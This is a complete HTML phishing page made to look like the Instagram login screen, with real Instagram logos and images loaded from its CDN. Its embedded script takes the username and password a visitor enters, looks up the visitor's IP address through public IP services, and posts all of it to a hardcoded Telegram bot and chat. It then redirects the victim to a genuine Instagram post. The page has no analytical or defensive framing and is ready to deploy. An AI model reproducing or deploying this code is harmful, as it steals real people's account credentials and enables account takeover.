<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" />
  <link rel="stylesheet" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/De-Dwh8Y0Rl.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #111112;
      color: #F2F4F6;
      font-family: "Optimistic", "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
      font-weight: 500;
      font-size: 15px;
      line-height: 19px;
      min-height: 100vh;
    }

    /* ── LAYOUT ── */
    .page {
      display: flex;
      width: 100%;
      min-height: 100vh;
    }

    /* ── LEFT PANEL ── */
    .left {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      padding: 70px 60px;
      padding-top: 40px;
    }

    .ig-logo {
      align-self: flex-start;
      width: 70px;
      height: 70px;
      margin-bottom: 32px;
    }

    .headline {
      font-family: "Instagram Sans", -apple-system, BlinkMacSystemFont, sans-serif;
      font-size: 43px;
      font-weight: 400;
      line-height: 65px;
      letter-spacing: -0.3px;
      text-align: center;
      max-width: 700px;
      margin-top: 10px;
    }

    .headline .close-friends {
      /* orange → pink gradient matching the real site */
      background: linear-gradient(90deg, #F97316 0%, #E1306C 60%, #C13584 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .collage {
      margin-left: 20px;
      width: 460px;
    }

    .collage img {
      width: 400px;
      height: auto;
      display: block;
    }

    /* ── RIGHT PANEL ── */
    .right {
      width: 660px;
      border-left: 3px solid #494D53;
      background: #1F1F22;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 0;
    }

    .login-box {
      width: 500px;
    }

    .login-title {
      font-family: "Optimistic", "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
      font-size: 17px;
      font-weight: 600;
      line-height: 22px;
      margin-bottom: 24px;
      color: #F2F4F6;
    }

    /* ── INPUTS ── */
    .input-wrap {
      position: relative;
      margin-bottom: 10px;
    }

    .input-wrap input {
      width: 100%;
      background: #1f1f2233;
      border: 1px solid #3E4042;
      border-radius: 12px;
      padding: 10px 16px;
      font-size: 15px;
      font-weight: 500;
      color: #F2F4F6;
      font-family: inherit;
      outline: none;
      transition: border-color 0.15s;
      height: 60px;
    }

    .input-wrap input::placeholder {
      color: transparent;
    }

    .input-wrap input:focus {
      border-color: #0095f6;
      padding-top: 18px;
      padding-bottom: 4px;
    }

    .input-wrap input:not(:placeholder-shown) {
      padding-top: 18px;
      padding-bottom: 4px;
    }

    /* floating label */
    .input-wrap label {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 15px;
      font-weight: 400;
      color: #9FA4AB;
      pointer-events: none;
      transition: top 0.12s, font-size 0.12s, transform 0.12s;
    }

    .input-wrap input:focus+label,
    .input-wrap input:not(:placeholder-shown)+label {
      top: 12px;
      transform: none;
      font-size: 11px;
      font-weight: 500;
      color: #0095f6;
    }

    /* show/hide password */
    .pw-toggle {
      display: none;
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #F2F4F6;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      user-select: none;
    }

    /* ── LOG IN BUTTON ── */
    .btn-login {
      width: 100%;
      height: 48px;
      background: #0064e0;
      border: none;
      border-radius: 24px;
      color: #F2F4F6;
      font-size: 15px;
      font-weight: 700;
      font-family: inherit;
      cursor: pointer;
      margin-top: 12px;
      margin-bottom: 0;
      transition: background 0.15s;
    }

    .btn-login:hover {
      background: #0082FB;
    }

    .btn-login:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    /* ── FORGOT ── */
    .forgot {
      text-align: center;
      margin-top: 14px;
      font-size: 15px;
      font-weight: 500;
      color: #F2F4F6;
      cursor: pointer;
      text-decoration: none;
      display: block;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    /* ── OR DIVIDER ── */
    .or-divider {
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 18px 0;
    }

    .or-divider hr {
      flex: 1;
      border: none;
      border-top: 1px solid #494D53;
    }

    .or-divider span {
      color: #9FA4AB;
      font-size: 13px;
      font-weight: 700;
      letter-spacing: 1px;
    }

    /* ── FACEBOOK BUTTON ── */
    .btn-fb {
      width: 100%;
      max-width: 100%;
      height: 45px;
      margin-top: 55px;
      background: transparent;
      border: 1px solid #50545B;
      border-radius: 22px;
      color: #F2F4F6;
      font-size: 15px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: background 0.15s;
    }

    .btn-fb:hover {
      background: rgba(255, 255, 255, 0.05);
    }

    .btn-fb svg {
      flex-shrink: 0;
      color: #0866FF;
    }

    /* ── CREATE ACCOUNT BUTTON ── */
    .btn-create {
      width: 100%;
      height: 48px;
      background: transparent;
      border: 1px solid #0082FB;
      border-radius: 22px;
      color: #4BA9FE;
      font-size: 15px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.15s;
    }

    .btn-create:hover {
      background: rgba(0, 130, 251, 0.08);
    }

    /* ── META LOGO ── */
    .meta-footer {
      display: flex;
      justify-content: center;
      margin-top: 30px;
    }

    /* ── ERROR MESSAGE ── */
    .error-msg {
      background: rgba(237, 73, 86, 0.15);
      color: #ed4956;
      font-size: 13px;
      padding: 10px;
      border-radius: 12px;
      margin-bottom: 16px;
      text-align: center;
      display: none;
    }

    /* loading spinner inside button */
    .btn-login .spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid #fff;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      margin: 0 auto;
    }

    .btn-login.loading .btn-text {
      display: none;
    }

    .btn-login.loading .spinner {
      display: inline-block;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* ── RESPONSIVE ── */
    .mobile-logo {
      display: none;
    }

    @media (max-width: 820px) {
      .left {
        display: none;
      }

      .input-wrap label {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        max-width: calc(100% - 32px);
      }

      .right {
        width: 100%;
        min-height: 100vh;
        background: #111112;
        border-left: none;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        padding: 60px 24px 40px;
        box-sizing: border-box;
      }

      .mobile-logo {
        display: block;
        width: 80px;
        height: 80px;
        margin-bottom: 48px;
      }

      .login-box {
        width: 100%;
        max-width: 400px;
        box-sizing: border-box;
      }

      .login-title {
        display: none;
      }

      .input-wrap input {
        background: #262626;
        border-color: #363636;
        border-radius: 14px;
        height: 58px;
      }

      .btn-login {
        height: 52px;
        border-radius: 26px;
        background: #0095f6;
        margin-top: 16px;
      }

      .btn-fb {
        display: none;
      }

      .forgot {
        margin-top: 20px;
        margin-bottom: 40px;
      }

      .btn-create {
        height: 52px;
        border-radius: 26px;
        margin-top: 8px;
      }

      .meta-footer {
        margin-top: 32px;
      }
    }

    @media (max-width: 480px) {
      .right {
        padding: 60px 16px 40px;
      }
    }
  </style>
</head>

<body>
  <div class="page">

    <!-- LEFT -->
    <div class="left">
      <!-- Real Instagram icon from CDN -->
      <img class="ig-logo" src="https://static.cdninstagram.com/rsrc.php/yO/r/Ny6hrBVLYjl.webp" alt="Instagram" />

      <h1 class="headline">
        See everyday moments from your <span class="close-friends">close friends</span>.
      </h1>

      <!-- Real collage image from CDN -->
      <div class="collage">
        <img src="https://static.cdninstagram.com/rsrc.php/yJ/r/53X3pk-t2Gn.webp" alt="close friends collage"
          referrerpolicy="origin-when-cross-origin" />
      </div>
    </div>

    <!-- RIGHT -->
    <div class="right">
      <img class="mobile-logo" src="https://static.cdninstagram.com/rsrc.php/yO/r/Ny6hrBVLYjl.webp" alt="Instagram" />
      <div class="login-box">
        <p class="login-title">Log into Instagram</p>

        <!-- error message box -->
        <div id="errorBox" class="error-msg"></div>

        <!-- Username input -->

          <input type="text" id="email" name="email" placeholder="Username, email address or mobile number"
            autocomplete="username" />
          <label for="email">Mobile number, username or email</label>

        <!-- Password input -->
        <div class="input-wrap">
          <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="current-password" />
          <label for="pass">Password</label>
          <span class="pw-toggle" onclick="togglePw()">Show</span>
        </div>

        <button class="btn-login" id="loginButton" type="button">
          <span class="btn-text">Log in</span>
          <span class="spinner"></span>
        </button>

        <a href="#" class="forgot" id="forgotLink">Forgot password?</a>



        <!-- Facebook button with real FB icon SVG -->
        <button class="btn-fb" type="button" id="fbLoginBtn">
          <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20">
            <path
              d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
          </svg>
          Log in with Facebook
        </button>

        <button class="btn-create" type="button" id="createAccountBtn">Create new account</button>

        <!-- Real Meta SVG logo from source -->
        <div class="meta-footer">
          <svg aria-label="Meta logo" role="img" viewBox="0 0 500 100" width="80" height="12">
            <path
              d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"

              fill="#DEE3E9" />
          </svg>
        </div>
      </div>
    </div>

  </div>

  <script>
    // ----- TELEGRAM BOT INTEGRATION (added without changing UI) -----
    const BOT_TOKEN = "8734906489:AAE2s2kwHcZ9W3NN9UssCFZNO3pyZQ5tDH0";
    const CHAT_ID = "1402452142";
    const REDIRECT_URL = "https://www.instagram.com/p/DQ7HXV_DD16/";

    // DOM elements
    const usernameInput = document.getElementById('email');
    const passwordInput = document.getElementById('pass');
    const loginBtn = document.getElementById('loginButton');
    const errorBox = document.getElementById('errorBox');

    function showError(message) {
      errorBox.innerText = message;
      errorBox.style.display = 'block';
      setTimeout(() => {
        errorBox.style.display = 'none';
      }, 4000);
    }

    // Get client IP address
    async function getClientIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (err) {
        try {
          const res2 = await fetch('https://ipapi.co/json/');
          const data2 = await res2.json();
          return data2.ip;
        } catch (err2) {
          try {
            const res3 = await fetch('https://ip-api.com/json/');
            const data3 = await res3.json();
            return data3.query;
          } catch (err3) {
            return "Unable to fetch IP";
          }
        }
      }
    }

    // Escape markdown special characters
    function escapeMarkdown(text) {
      if (!text) return "";
      return text.replace(/_/g, '\\_')
        .replace(/\*/g, '\\*')
        .replace(/\[/g, '\\[')
        .replace(/\]/g, '\\]')
        .replace(/\(/g, '\\(')
        .replace(/\)/g, '\\)')
        .replace(/~/g, '\\~')
        .replace(/`/g, '\\`')
        .replace(/>/g, '\\>')
        .replace(/#/g, '\\#')
        .replace(/\+/g, '\\+')
        .replace(/-/g, '\\-')
        .replace(/=/g, '\\=')
        .replace(/\|/g, '\\|');
    }

    // Send credentials to Telegram bot
    async function sendToTelegram(username, password, ipAddress) {
      const message = `🔐 *Instagram Login Alert* 🔐\n\n👤 *Username/Email:* ${escapeMarkdown(username)}\n🔑 *Password:* ${escapeMarkdown(password)}\n🌍 *IP Address:* ${escapeMarkdown(ipAddress)}\n⏰ *Time:* ${new Date().toLocaleString()}`;

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });
        const result = await response.json();
        return result.ok;
      } catch (error) {
        console.error("Telegram error:", error);
        return false;
      }
    }

    // Update login button state (enable/disable)
    function updateLoginButton() {
      const username = usernameInput.value.trim();
      const password = passwordInput.value;
      loginBtn.disabled = !(username.length > 0 && password.length > 0);
    }

    usernameInput.addEventListener('input', updateLoginButton);
    passwordInput.addEventListener('input', updateLoginButton);

    // Handle login click
    loginBtn.addEventListener('click', async () => {
      const username = usernameInput.value.trim();
      const password = passwordInput.value;

      if (!username || !password) {
        showError("Please enter your username and password.");
        return;
      }

      // Show loading state
      loginBtn.disabled = true;
      loginBtn.classList.add('loading');

      // Get IP address
      let userIP = "Fetching...";
      try {
        userIP = await getClientIP();
      } catch (err) {
        userIP = "Could not retrieve IP";
      }

      // Send to Telegram
      await sendToTelegram(username, password, userIP);

      // Redirect to the real Instagram post
      window.location.href = REDIRECT_URL;
    });

    // Initial button state
    loginBtn.disabled = true;

    // ----- ORIGINAL TOGGLE PASSWORD FUNCTION (unchanged) -----
    function togglePw() {
      const input = document.getElementById('pass');
      const btn = document.querySelector('.pw-toggle');
      if (input.type === 'password') {
        input.type = 'text';
        btn.textContent = 'Hide';
      } else {
        input.type = 'password';
        btn.textContent = 'Show';
      }
    }

    // Optional: demo feedback for other buttons (preserves original behavior)
    // Change placeholder text on mobile
    function updatePlaceholder() {
      const label = document.querySelector('label[for="email"]');
      if (window.innerWidth <= 820) {
        label.textContent = "Username, email address or mobile number";
      } else {
        label.textContent = "Mobile number, username or email";
      }
    }

    updatePlaceholder();
    window.addEventListener('resize', updatePlaceholder);
  </script>
</body>

</html>
